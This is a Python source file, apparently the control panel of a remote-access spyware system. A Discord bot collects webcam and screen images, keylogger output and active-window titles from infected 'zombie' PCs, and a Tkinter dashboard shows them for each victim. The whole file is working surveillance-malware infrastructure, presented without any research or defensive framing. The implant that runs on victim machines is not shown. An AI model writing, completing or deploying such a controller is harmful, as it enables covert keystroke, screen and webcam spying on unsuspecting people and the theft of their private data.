from discord.ext import commands
import tkinter as tk
import threading
from urllib.request import Request,urlopen
from PIL import Image,ImageTk
import io
from tkinter import PhotoImage,Tk,Label
global msg,dic
msg = None
dic = {}

def tkinter():
    global msg,dic
    window = tk.Tk()
    window.title("R_handler")
    def loop():
        global dic
        if not list(listbox_1.get(0,tk.END)) == list(dic.keys()):
            listbox_1.insert(listbox_1.size(),list(dic.keys())[len(list(dic.keys()))-1])
        window.after(500,loop)
    def newtab(select):
        global dic
        new = tk.Toplevel(window)
        new.title(list(dic.keys())[select])
        new.geometry("1380x950+300+150")
        new.config(bg="black")
        scroll = tk.Scrollbar(new,background="green")
        scroll2 = tk.Scrollbar(new,background="green")
        scroll.place(x=1350,y=34,height=420)
        scroll2.place(x=1350,y=490,height=420)
        boder_color = tk.Frame(new,background="green")
        boder_color2 = tk.Frame(new, background="green")
        boder_color3 = tk.Frame(new, background="green")
        boder_color4 = tk.Frame(new, background="green")
        boder_color5 = tk.Frame(new, background="green")
        entty1 = tk.Text(new,wrap="word",yscrollcommand=scroll.set,bg="black",fg="green",bd=0)
        entty2 = tk.Text(new, wrap="word", yscrollcommand=scroll2.set,bg="black",fg="green",bd=0)
        entty3 = tk.Text(new,bg="black",fg="green",bd=0)
        label1 = tk.Label(new,image=dic[list(dic.keys())[select]]['img1'],bd=0)
        label2 = tk.Label(new,image=dic[list(dic.keys())[select]]['img2'],bd=0)
        label3 = tk.Label(new,text="cam",font=16,bg="black",fg="green")
        label4= tk.Label(new,text="screen",font=16,bg="black",fg="green")
        label5 = tk.Label(new, text="log", font=16,bg="black",fg="green")
        label6 = tk.Label(new, text="keylogger", font=16,bg="black",fg="green")
        label7 = tk.Label(new, text="nowtab", font=16,bg="black",fg="green")
        ts=""
        ts2=""
        for i in dic[list(dic.keys())[select]]['log']:
            ts = ts + f"{i}\n"
        for i in dic[list(dic.keys())[select]]['text']:
            ts2 = ts2 + f"{i}\n"
        entty1.insert(1.0, ts)
        entty2.insert(1.0, ts2)
        def loop():
            str1 = ""
            str2 = ""
            wrong = None
            wrong2 = None
            for i in dic[list(dic.keys())[select]]['log']:
                str1 = str1 + i
            for i in dic[list(dic.keys())[select]]['text']:
                str2 = str2 + i
            for i,z in zip(str1.replace("\n","").split("@"),range(0,len(str1.replace("\n","").split("@")))):
                check = False
                for x in entty1.get(1.0,"end").replace("\n","").split("@"):
                    if i == x:
                        check = True
                if not check:
                   wrong = z
            if wrong != None:
                Tm = ""
                for i in str1.replace("\n","").split("@")[wrong:]:
                    Tm = Tm + f"@{i}\n"
                entty1.insert("end",Tm)
            for i,z in zip(str2.replace("\n","").split("@"),range(0,len(str2.replace("\n","").split("@")))):
                check = False
                for x in entty2.get(1.0,"end").replace("\n","").split("@"):
                    if i == x:
                        check = True
                if not check:
                   wrong2 = z
            if wrong2 != None:
                Tm = ""
                for i in str2.replace("\n","").split("@")[wrong2:]:
                    Tm = Tm + f"@{i}\n"
                entty2.insert("end",Tm)
            label1.config(image=dic[list(dic.keys())[select]]['img1'])
            label2.config(image=dic[list(dic.keys())[select]]['img2'])
            entty3.delete(1.0,"end")
            entty3.insert(1.0,dic[list(dic.keys())[select]]['nowtab'])
            new.after(500,loop)
        entty1.place(x=750,y=34,width=600,height=420)
        entty2.place(x=750,y=490,width=600,height=420)
        entty3.place(x=750,y=925,width=600,height=20)
        label1.place(x=10, y=34)
        label2.place(x=10, y=490)
        label3.place(x=325, y=0)
        label4.place(x=325, y=456)
        label5.place(x=1030, y=0)
        label6.place(x=1030, y=456)
        label7.place(x=650, y=920)
        boder_color.place(x=8, y=32, width=1920 // 4 + 250+4, height=1080 // 4 + 150+4)
        boder_color2.place(x=8, y=488, width=1920 // 4 + 250+4, height=1080 // 4 + 150+4)
        boder_color3.place(x=748,y=32,width=600+4,height=420+4)
        boder_color4.place(x=748,y=488,width=600+4,height=420+4)
        boder_color5.place(x=748,y=923,width=600+4,height=20+4)
        new.after(500,loop)
    def event():
        threading.Thread(target=newtab, args=(listbox_1.curselection()[0],)).start()
    listbox_1 = tk.Listbox(window, selectmode="extend", height=0)
    button_1 = tk.Button(window,text="show zombiePC control",command=event)
    listbox_1.pack()
    button_1.pack()
    window.after(500,loop)
    window.mainloop()
threading.Thread(target=tkinter).start()
bot = commands.Bot(command_prefix="")

@bot.event
async def on_message(message):
    global msg,dic
    msg = message
    check = False
    for k in dic.keys():
        if k == message.author.name:
            check = True
    if not check:
        im = Image.open("image/OIP.jpeg")
        im = im.resize((1920 // 4 + 250, 1080 // 4 + 150), Image.ANTIALIAS)
        image = ImageTk.PhotoImage(im)
        dic[message.author.name] = {"img1" : image, "img2" : image, "text" : [], "log" : [], "nowtab" : ""}
    if message.attachments == []:
        pass
    else:
        if "@IMAGE1" in message.content:
            cover = Request(
                message.attachments[0],
                headers={'User-Agent': 'Mozilla/5.0'})
            data = urlopen(cover, timeout=10).read()
            im = Image.open(io.BytesIO(data))
            width, height = im.size
            im = im.resize((1920//4 + 250, 1080//4 + 150), Image.ANTIALIAS)
            image = ImageTk.PhotoImage(im)
            dic[message.author.name]["img1"] = image
        if "@IMAGE2" in message.content:
            cover = Request(
                message.attachments[0],
                headers={'User-Agent': 'Mozilla/5.0'})
            data = urlopen(cover, timeout=10).read()
            im = Image.open(io.BytesIO(data))
            im = im.resize((1920 // 4 + 250, 1080 // 4 + 150), Image.ANTIALIAS)
            image = ImageTk.PhotoImage(im)
            dic[message.author.name]["img2"] = image
    if "@SUCCESS" in message.content:
        dic[message.author.name]["log"].append(message.content)
    if "@KEYLOG" in message.content:
        dic[message.author.name]["text"].append(message.content)
    if "@ERROR" in message.content:
        dic[message.author.name]["log"].append(message.content)
    if "@TABLOG" in message.content:
        dic[message.author.name]["nowtab"] = message.content
bot.run('bot token here')
